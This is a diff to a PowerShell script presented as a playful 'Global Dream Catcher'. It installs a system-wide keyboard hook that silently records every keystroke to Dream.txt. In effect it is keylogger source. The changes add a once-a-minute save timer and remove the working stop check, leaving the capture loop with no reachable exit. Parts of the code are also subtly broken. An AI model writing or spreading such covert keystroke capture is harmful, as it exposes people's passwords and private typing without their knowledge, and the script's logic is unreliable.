@@ -41,6 +41,22 @@ $hInstance = [System.IntPtr]::Zero
 # Obtain the current thread ID using kernel32.dll
 $threadId = [System.Diagnostics.Process]::GetCurrentProcess().Threads[0].Id
 
+$DreamFileName = "Dream.txt"
+
+# Function to save the content to a file
+function SaveDreamContent {
+    $DreamContent | Set-Content -Path $DreamFileName -Force
+}
+
+# Create a timer to save the content every minute
+$saveTimer = New-Object System.Timers.Timer
+$saveTimer.Interval = 60000  # 60,000 milliseconds (1 minute)
+$saveTimer.Enabled = $true
+
+$saveTimer.add_Elapsed({
+    SaveDreamContent
+})
+
 $keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_KEYBOARD_LL, {
     param($nCode, $wParam, $lParam)
 
@@ -49,11 +65,6 @@ $keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_
         [System.Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [ref]$kbStruct)
 
         $KeyChar = [char]$kbStruct.vkCode
-
-        # Pressing Ctrl+ALT+S stops the capture
-        if ($KeyChar -eq 'S' -and [Console]::Modifiers -eq [ConsoleModifiers]::Control -and [Console]::Modifiers -eq [ConsoleModifiers]::Alt) {
-            $StopFlag = $true
-        }
 
         if (-not $StopFlag) {
             $DreamContent += $KeyChar
@@ -65,21 +76,23 @@ $keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_
 
 Write-Host "Welcome to the Global Dream Catcher with Stop Feature!"
 Write-Host "Type your thoughts using any keyboard input, and it will be captured silently."
-Write-Host "Press Ctrl+ALT+S to stop capturing."
+Write-Host "Press Ctrl+ALT+8 to stop capturing."
 
 # Start capturing user input
 while ($true) {
     if ($StopFlag) {
-        break
+        # Check for Ctrl+Alt+8 to stop the program
+        if ([Console]::Modifiers -band [ConsoleModifiers]::Control -and [Console]::Modifiers -band [ConsoleModifiers]::Alt -and [Console]::KeyAvailable -and [Console]::ReadKey().Key -eq '8') {
+            break
+        }
     }
+    Start-Sleep -Milliseconds 100  # Sleep for a short time to reduce CPU usage
 }
 
 # Unhook the global keyboard hook
 [GlobalKeyboardHook]::UnhookWindowsHookEx($keyboardHook)
 
-$DreamFileName = "Dream.txt"
-
-# Save the user's thoughts to a .txt file
-$DreamContent | Out-File -FilePath $DreamFileName
+# Save the content one last time before exiting
+SaveDreamContent
 
 Write-Host "Your dream has been saved in '$DreamFileName'. Goodnight and sweet dreams!"
